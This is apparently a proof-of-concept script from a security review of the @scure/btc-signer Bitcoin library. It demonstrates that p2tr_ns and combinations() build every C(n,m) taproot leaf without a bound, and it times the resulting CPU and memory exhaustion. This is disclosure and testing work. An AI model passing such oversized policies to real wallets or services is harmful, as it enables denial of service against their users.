// PoC: p2tr_ns / combinations materialize all C(n, m) taproot leaves with no
// size cap. A counterparty-suggested m-of-n policy can force CPU/memory
// exhaustion in any consumer that builds the leaf set from untrusted input.
//
// Reviewed commit: 68b2fad4ef8232302c6239c00902def1f511c974 (@scure/btc-signer 2.2.0)
// Code references:
//   payment.ts:1207 comment "Takes O(n^2) if m != n. 99-of-100 is ok, 5-of-100 is not"
//   payment.ts:1232-1245 p2tr_ns -> combinations(m, pubkeys) (no bound)
//   payment.ts:1172-1203 combinations() (no bound)
//
// Setup: npm install && cd test && ../node_modules/.bin/tsc
// Run:   REPO=<worktree> node --experimental-global-webcrypto poc.mjs

import path from 'node:path';
import { pathToFileURL } from 'node:url';

const REPO = process.env.REPO;
if (!REPO) throw new Error('set REPO=<path-to-worktree>');
const src = (f) => pathToFileURL(path.join(REPO, 'test/compiled/src', f)).href;
const nm = (f) => pathToFileURL(path.join(REPO, 'node_modules', f)).href;

const { hex } = await import(nm('@scure/base/index.js'));
const u = await import(src('utils.js'));
const { p2tr_ns, combinations } = await import(src('payment.js'));

const key = (i) => u.pubSchnorr(u.sha256(new Uint8Array([i & 0xff, (i >> 8) & 0xff])));
const keys = (n) => Array.from({ length: n }, (_, i) => key(i));

// 1) There is NO n limit at all: 100 keys accepted silently (tr_ns matcher
//    allows up to 999 keys per leaf; p2tr_ns has no n guard).
{
  const leaves = p2tr_ns(1, keys(100)); // C(100,1) = 100, cheap
  console.log('[1] p2tr_ns(1, keys(100)) accepted, leaves =', leaves.length, '(no n bound)');
}

// 2) Time/memory growth for mid-range thresholds: C(n,m) explodes, and every
//    materialized leaf re-runs OutScript.encode -> per-key schnorr lift_x
//    validation, so CPU cost is C(n,m) x m curve operations, not just C(n,m).
console.log('\n[2] measured cost of p2tr_ns(m, keys(n)) (no guard fires):');
console.log('    n   m  C(n,m)          time_ms  rss_delta_MB  us_per_leaf');
let prev = null;
for (const [n, m] of [[14, 7], [16, 8], [18, 9], [20, 10]]) {
  const before = process.memoryUsage().rss;
  const t0 = Date.now();
  const leaves = p2tr_ns(m, keys(n));
  const dt = Date.now() - t0;
  const rss = (process.memoryUsage().rss - before) / 1048576;
  const c = leaves.length;
  console.log(`    ${n}  ${m}  ${String(c).padEnd(15)} ${String(dt).padStart(8)}  ${rss.toFixed(1).padStart(11)}  ${(1000 * dt / c).toFixed(1)}`);
  if (prev) console.log(`        growth x${(dt / prev).toFixed(1)} per +2 keys`);
  prev = dt;
}
console.log('    extrapolating at x4.3 per +2 keys: p2tr_ns(12, keys(24)) ~ 2.7M leaves ~ 45 min, ~3 GB');
console.log('    (the (20,10) row alone revalidates 1.8M schnorr keys inside OutScript.encode)');

// 3) The policy a counterparty can suggest that the comment itself calls
//    "not OK": 5-of-100. We do NOT run it (would allocate ~75M leaves);
//    just prove the guard is absent by counting what would be materialized.
function binom(n, k) {
  let r = 1n;
  for (let i = 0n; i < BigInt(k); i++) r = (r * BigInt(n) - r * BigInt(i)) / (BigInt(i) + 1n);
  return r;
}
console.log('\n[3] unbounded materialization for counterparty-suggested policies:');
for (const [n, m] of [[30, 15], [50, 25], [100, 5], [100, 50]])
  console.log(`    p2tr_ns(${m}, keys(${n})) would allocate C(${n},${m}) = ${binom(n, m)} leaf descriptors`);
console.log('    (measured above: C(20,10) = 184k leaves already costs >150s CPU; 75M+ leaves is a hard OOM/hang)');

// 4) p2tr() then hashes every leaf, multiplying the cost.
console.log('\n[4] p2tr(undefined, p2tr_ns(m, keys(n))) additionally hashes C(n,m) leaves and builds');
console.log('    the full annotated tree + control blocks: total cost is a multiple of the leaf count.');
const t0 = Date.now();
const r = (await import(src('payment.js'))).p2tr(undefined, p2tr_ns(8, keys(16)));
console.log('    p2tr(undefined, p2tr_ns(8, keys(16))): leaves =', r.leaves.length, 'in', Date.now() - t0, 'ms');

console.log('\nRESULT: no bound exists on C(n,m); availability depends entirely on caller hygiene.');
